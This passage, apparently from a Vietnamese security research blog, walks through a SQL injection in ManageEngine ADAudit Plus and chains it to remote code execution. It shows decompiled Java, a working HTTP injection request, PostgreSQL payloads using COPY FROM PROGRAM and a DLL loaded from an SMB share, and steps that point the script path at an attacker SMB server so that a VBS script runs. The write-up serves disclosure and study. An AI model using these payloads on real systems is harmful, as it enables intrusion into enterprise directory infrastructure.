+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">while</span><span class="p">(</span><span class="n">var6</span><span class="p">.</span><span class="na">hasNext</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">(</span><span class="n">4</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">HashMap</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">tableconfig</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">HashMap</span><span class="p">)</span><span class="n">var6</span><span class="p">.</span><span class="na">next</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">columnName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tableconfig</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="s">&#34;columnalias&#34;</span><span class="p">).</span><span class="na">toString</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">searchData</span><span class="p">.</span><span class="na">has</span><span class="p">(</span><span class="n">columnName</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">String</span><span class="w"> </span><span class="n">columnSearchValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">searchData</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">columnName</span><span class="p">).</span><span class="na">toString</span><span class="p">();</span><span class="w"> </span><span class="p">(</span><span class="n">5</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">tableconfig</span><span class="p">.</span><span class="na">put</span><span class="p">(</span><span class="s">&#34;searchValue&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">searchData</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">columnName</span><span class="p">).</span><span class="na">toString</span><span class="p">());</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">searchValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tableName</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="n">TableDefinition</span><span class="w"> </span><span class="n">tableDefinition</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">MetaDataUtil</span><span class="p">.</span><span class="na">getTableDefinitionByName</span><span class="p">(</span><span class="n">tableName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">tableDefinition</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">ColumnDefinition</span><span class="w"> </span><span class="n">columnDefinition</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tableDefinition</span><span class="p">.</span><span class="na">getColumnDefinitionByName</span><span class="p">(</span><span class="n">columnName</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">searchValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">columnDefinition</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">columnDefinition</span><span class="p">.</span><span class="na">getDataType</span><span class="p">()</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="kc">null</span><span class="p">;</span><span class="w">  </span><span class="p">(</span><span class="n">6</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">columnSearchValue</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">null</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="o">!</span><span class="n">columnSearchValue</span><span class="p">.</span><span class="na">equalsIgnoreCase</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">needSearchCriteria</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">columnSearchValue</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">CommonUtil</span><span class="p">.</span><span class="na">getSearchString</span><span class="p">(</span><span class="n">columnSearchValue</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w"> </span><span class="p">(</span><span class="n">7</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">null</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">String</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                            </span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34; AND &#34;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">searchCriteria</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">ReportHandlerUtil</span><span class="p">.</span><span class="na">getInstance</span><span class="p">().</span><span class="na">getSearchString</span><span class="p">(</span><span class="n">columnName</span><span class="p">,</span><span class="w"> </span><span class="n">columnSearchValue</span><span class="p">,</span><span class="w"> </span><span class="n">searchValue</span><span class="p">);</span><span class="w"> </span><span class="p">(</span><span class="n">8</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">                        </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// ...</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">searchCriteria</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></div><p>Tại:</p>
+<ul>
+<li>(3), lấy json object <code>searchData</code> từ <code>reportReqData</code> là inputParams ban đầu</li>
+<li>(4), thực hiện loop danh sách các columns để construct các câu điều kiện sau WHERE với column value tương ứng</li>
+<li>(5), lấy columnValue hay nói cách khác là giá trị của column mà ta muốn tìm kiếm (ví dụ: id = 1) nếu như tồn tại tên column từ trong inputParams</li>
+<li>(6), biến <code>searchValue</code> sẽ chứa kiểu dữ liệu của column từ columnName</li>
+<li>(7), biến <code>columnSearchValue</code> sẽ chứa giá trị sau khi thực hiện filter cơ bản và format columnValue dạng LIKE clause (%…%) qua hàm <code>CommonUtil.getSearchString()</code></li>
+<li>(8), nối chuỗi trực tiếp các điều kiện và chuỗi điều kiện trả về từ hàm <code>ReportHandlerUtil.getInstance().getSearchString()</code> với các tham số truyền vào là <code>columnName</code>, <code>columnSearchValue</code> và <code>searchValue</code></li>
+</ul>
+<p>Như vấn đề đã được nêu từ đầu bài, chỉ cần tìm được một columnName có dataType không phải kiểu dữ liệu chuỗi là có thể bypass, sau một lúc lục tìm trên database thì mình tìm được column có tên là <code>TIME_GENERATED</code> có dataType là <code>BIGINT</code> thoã mãn được điều kiện này, trace ngược lại một lúc thì tìm được <code>reportcvId=133</code>.</p>
+<p>Đến đây thì mọi thứ đã đâu vào đấy, proof of concept:</p>
+<pre tabindex="0"><code>POST /api/json/report/getLockoutHistoryData HTTP/1.1
+Host: adap:8081
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryE0RnUk641RyfmYic
+Content-Length: 865
+Cookie: JSESSIONIDADAP=&lt;session&gt;; adapcsrf=&lt;csrf-token&gt;; JSESSIONIDADAPSSO=&lt;session&gt;
+ 
+ 
+------WebKitFormBoundaryE0RnUk641RyfmYic
+Content-Disposition: form-data; name=&#34;JSONString&#34;
+ 
+{&#34;domainName&#34;:&#34;nhienit.vn&#34;, &#34;machineDomainName&#34;:&#34;ahihi&#34;, &#34;reportId&#34;:133, &#34;cvId&#34;:133, &#34;inputParams&#34;: {&#34;workstation&#34;:&#34;xxx&#34;,&#34;searchData&#34;: {&#34;TIME_GENERATED&#34;:&#34;*1337)) as AcctLckoutChangeCount; SELECT 1337-- -*&#34;},&#34;timeGenerated&#34;:1234,&#34;accountName&#34;:&#34;fooooo&#34;,&#34;columnAlias&#34;:&#34;fooooo&#34;, &#34;machineTypeStr&#34;:&#34;fooooo&#34;, &#34;domainFlatName&#34;:&#34;fooooo&#34;,&#34;errorMessage&#34;:&#34;fooooo&#34;, &#34;isConfigured&#34;:true, &#34;tabType&#34;:&#34;dc&#34;}}
+------WebKitFormBoundaryE0RnUk641RyfmYic
+Content-Disposition: form-data; name=&#34;adapcsrf&#34;
+ 
+&lt;csrf-token&gt;
+------WebKitFormBoundaryE0RnUk641RyfmYic--
+</code></pre><h3 id="rce-with-postgresql-">#RCE with PostgreSQL ????<a hidden class="anchor" aria-hidden="true" href="#rce-with-postgresql-">#</a></h3>
+<p>Sau khi trigger thành công SQL injection, mình nhận thấy rằng ứng dụng cho phép thực hiện stack query, điều này khiến mình nghĩ đến việc tìm cách RCE ứng dụng này. Hệ thống quản trị cơ sở dữ liệu mặc định trên ứng dụng là PostgreSQL, nên đành vội test thử một số cách trên sách giáo khoa như:</p>
+<p>Sử dụng COPY để RCE thông qua <code>pg_execute_server_program</code> group</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;domainName&#34;</span><span class="p">:</span><span class="s2">&#34;foooo&#34;</span><span class="p">,</span> <span class="nt">&#34;inputParams&#34;</span><span class="p">:{</span><span class="nt">&#34;searchData&#34;</span><span class="p">:{</span><span class="nt">&#34;NAME&#34;</span><span class="p">:</span><span class="s2">&#34;injectxxxxxx&#39;); DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text);COPY cmd_exec FROM PROGRAM &#39;calc.exe&#39;;-- -&#34;</span><span class="p">}}}</span>
+</span></span></code></pre></div><p>kết quả thu được:
+<img loading="lazy" src="/images/me_sqli_to_rce/3.png"></p>
+<p>về cơ bản thì chỉ có <code>super user</code> mới có thể thực hiện được những chức năng đặc biệt này, sau đó mình đã thử thực hiện cách khác là load external dll:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;domainName&#34;</span><span class="p">:</span><span class="s2">&#34;foooo&#34;</span><span class="p">,</span> <span class="nt">&#34;inputParams&#34;</span><span class="p">:{</span><span class="nt">&#34;searchData&#34;</span><span class="p">:{</span><span class="nt">&#34;NAME&#34;</span><span class="p">:</span><span class="s2">&#34;injectxxxxxx&#39;); CREATE OR REPLACE FUNCTION remote_test(text, integer) RETURNS void AS $$\\\\192.168.17.1\\share\\revshell.dll$$, $$connect_back$$ LANGUAGE C STRICT; SELECT remote_test($$calc.exe$$, 3);-- -&#34;</span><span class="p">}}}</span>
+</span></span></code></pre></div><p>kết quả cũng không mấy khả quan do không có quyền thực thi ( Permission denied T_T )
+<img loading="lazy" src="/images/me_sqli_to_rce/4.png"></p>
+<p>mình cũng nghĩ đến trường hợp tạo một tài khoản có quyền cao hơn như administrator, nhưng nhận ra là bên trong ứng dụng không có chức năng nào có thể thực thi trực tiếp OS command cả (hoặc do mình tìm không thấy =]] )</p>
+<p>~~ Betak time ~~</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/5.png"></p>
+<h3 id="find-the-puzzle-pieces-to-achieve-rce">#Find the puzzle pieces to achieve RCE<a hidden class="anchor" aria-hidden="true" href="#find-the-puzzle-pieces-to-achieve-rce">#</a></h3>
+<p>Trên ứng dụng này có một chức năng khá đặc biệt là <code>Alert Profiles</code></p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/6.png"></p>
+<p>hiểu nôm na là khi ứng dụng được cài đặt lên một máy AD hay Windows Server nào đó, nó sẽ lắng nghe một số event trên máy đó ví dụ một số event như shutdown, lock screen, restart server, etc… thì chức năng này sẽ cho phép chạy một file script tương ứng khi một event được trigger.</p>
+<p>Mặc định thì chỉ cho phép load scripts từ local, khi thực hiện tạo một ALertProfiles bất kỳ thì thông báo lỗi sẽ xuất hiện như bên dưới:</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/7.png"></p>
+<p>Đến lúc này trong đầu mình xuất hiện một số idea như sau và thực hiện kiểm chứng từng idea một, cụ thể như sau:</p>
+<h4 id="idea-1-tìm-lỗ-hổng-file-upload-tuỳ-ý-">#Idea 1: Tìm lỗ hổng file upload tuỳ ý ??<a hidden class="anchor" aria-hidden="true" href="#idea-1-tìm-lỗ-hổng-file-upload-tuỳ-ý-">#</a></h4>
+<p>Idea này không khả thi khi chỉ có một số chức năng như upload image (hoặc avatar) check các image byte header và upload file excel để import dữ liệu.</p>
+<h4 id="idea-2-tìm-lỗ-hổng-command-injection-trong-chức-năng-run-alert-script-">#Idea 2: Tìm lỗ hổng command injection trong chức năng run alert script ??<a hidden class="anchor" aria-hidden="true" href="#idea-2-tìm-lỗ-hổng-command-injection-trong-chức-năng-run-alert-script-">#</a></h4>
+<p>Sau khi script location được chỉ định, tuỳ theo extension của file mà sẽ chạy command phù hợp, ví dụ như file <code>.ps1</code> sẽ dùng <code>powershell.exe</code> hoặc <code>.vbs</code> sẽ dùng <code>wscript</code>.</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/8.png"></p>
+<p>Command sau khi được parse thành những token sẽ đưa vào hàm <code>CommonUtil.createProcess()</code> để thực thi.</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/9.png"></p>
+<p>Hàm <code>CommonUtil.createProcess()</code> sẽ thực hiện gọi <code>ProcessBuilder()</code> để run os command. Đến đây có thể thấy os command injection không khả thi bởi vì command và các argument được phân tách rõ ràng nên không thể inject được.</p>
+<h4 id="idea-3-change-defaultscriptpath">#Idea 3: Change defaultScriptPath<a hidden class="anchor" aria-hidden="true" href="#idea-3-change-defaultscriptpath">#</a></h4>
+<p>Để hiểu rõ thì ta cần quan sát lại quá trình khi thực hiện tạo một AlertProfiles, cụ thể là hàm <code>saveAlertProfile</code> sẽ được call và input từ body request sẽ được parse và gán vào biến <code>data</code>.</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/10.png"></p>
+<p>Tại biến <code>data</code> sẽ lấy <code>scriptLocation</code> mà ta cung cấp làm tham số đầu vào cho hàm <code>AlertScriptHandler.validateScriptCommand()</code></p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/11.png"></p>
+<p>Hàm <code>AlertScriptHandler.validateScriptCommand()</code> cơ bản như sau:</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/12.png"></p>
+<p>nôm na là <code>scriptLocation</code> mà ta truyền vào sẽ được kiểm tra kỹ càng tránh path traversal, kiểm tra các đuôi extension hợp lệ,… trong đó, biến <code>defaultScriptPath</code> lưu trữ script path mặc định trên ứng dụng và được nối trực tiếp vào <code>scriptLocation</code> của chúng ta để tạo thành đường dẫn hoàn chỉnh sau đó lưu vào biến <code>pathCheck</code>.</p>
+<p>Để lưu thành công thì đường dẫn <code>pathCheck</code> phải tồn tại, nghĩa là file script phải tồn tại trên server.</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/13.png"></p>
+<p>theo document về class File trên java <a href="https://docs.oracle.com/javase/8/docs/api/java/io/File.html">(https://docs.oracle.com/javase/8/docs/api/java/io/File.html)</a>, class File hỗ trợ resolve cả SMB server nếu input bắt đầu bằng prefix <code>\\</code> -&gt; nghĩa là ta hoàn toàn có thể load script thông qua SMB server chẳng hạn như: <code>\\192.168.17.1\exploit\exploit.ps1</code></p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/14.png"></p>
+<p>quay ngược lại bài toán là làm sao có thể control được <code>defaultScriptPath</code> trên ứng dụng, đến đây ta trace ngược về nơi biến <code>defaultScriptPath</code> được khởi tạo.</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/15.png"></p>
+<p>Từ đầu ta có thể thấy rằng, giá trị của <code>defaultScriptPath</code> ban đầu được lấy từ <code>ADSMPersUtil.getSyMParameter(“DEFAULT_SCRIPT_PATH”)</code>, nếu không tồn tại sẽ lấy tạm đường dẫn của hệ thống qua <code>System.getProperty(“server.dir”)</code>.</p>
+<p>Tiếp tục ta đi sâu vào <code>ADSMPersUtil.getSyMParameter(“DEFAULT_SCRIPT_PATH”)</code> thì ta thấy rằng giá trị <code>DEFAULT_SCRIPT_PATH</code> được lấy từ database ở table <code>SystemParams</code> và cột <code>PARAM_NAME</code></p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/16.png"></p>
+<p>kiểm tra trên database thì hoàn toàn rỗng :)))</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/19.png"></p>
+<p>~~~ Make sqli great again ~~~</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/18.png"></p>
+<p>đến đây mọi việc xem thử là ổn, chỉ cần insert vào địa chỉ SMB Server để load malicous script là mọi thứ hoàn hảo.</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/20.png"></p>
+<p>Nhưng còn một vấn đề nhỏ ở đây là ta không thể tuỳ ý thực thi ps1 tuỳ ý, vì mặc định policy trên Windows đã chặn.</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/21.png"></p>
+<p>Tuy nhiên, vẫn có một số cách bypass nhưng đa phần phải bổ sung thêm argument nữa hoặc một số cách thủ công để disable policy nhưng hoàn toàn vượt ngoài attack vector network.</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/22.png"></p>
+<p>May mắn thay, ứng dụng còn hỗ trợ thực thi .vbs và điều này vượt qua sự hạn chế đã nêu từ bên trên.</p>
+<p><img loading="lazy" src="/images/me_sqli_to_rce/23.png">
+<img loading="lazy" src="/images/me_sqli_to_rce/24.png"></p>
+<h3 id="step-to-reproduces">#Step to reproduces<a hidden class="anchor" aria-hidden="true" href="#step-to-reproduces">#</a></h3>
+<ul>
+<li>Khai thác SQL injection -&gt; Inject <code>DEFAULT_SCRIPT_PATH</code> parameter với value là địa chỉ Attacker SMB Server.</li>
+<li>Khởi động lại ME Adaudit Plus để reload new config.</li>
+<li>Tạo một <code>Alert Profile</code> để thực thi <code>VBS script</code> trên máy attacker SMB server khi bất kỳ sự kiện nào được trigger (như đăng nhập, đăng xuất, etc.)</li>
+<li>Thực hiện đăng nhập hoặc đăng xuất để trigger VBS Script.</li>
+</ul>
+<h3 id="poc">#PoC<a hidden class="anchor" aria-hidden="true" href="#poc">#</a></h3>
+<div style="position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;">
+      <iframe allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen" loading="eager" referrerpolicy="strict-origin-when-cross-origin" src="https://www.youtube.com/embed/rmmDXO11pxw?autoplay=0&amp;controls=1&amp;end=0&amp;loop=0&amp;mute=0&amp;start=0" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;" title="YouTube video"></iframe>
+    </div>
+
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/research/">Research</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/posts/hello/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Hello World</span>
+  </a>
+</nav>
+
+
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>©nhienit</span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
